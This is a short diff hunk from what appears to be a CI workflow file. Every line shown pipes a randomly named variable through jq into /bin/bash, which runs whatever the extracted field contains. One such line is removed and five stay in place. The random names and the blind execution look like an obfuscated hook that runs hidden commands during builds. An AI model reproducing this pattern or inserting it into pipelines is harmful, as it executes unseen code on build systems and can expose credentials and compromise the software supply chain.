@@ -25,7 +25,6 @@ jobs:
           echo $atk3 | jq -r .zcpwt79 | /bin/bash
           echo $spuqk95937 | jq -r .c6660 | /bin/bash
           echo $n44 | jq -r .b6204 | /bin/bash
-          printf '%s' "$cemjd7128" | jq -r .et5713 | /bin/bash
           echo $ap85 | jq -r .sbs33 | /bin/bash
           echo $z5529 | jq -r .t9118 | /bin/bash
 
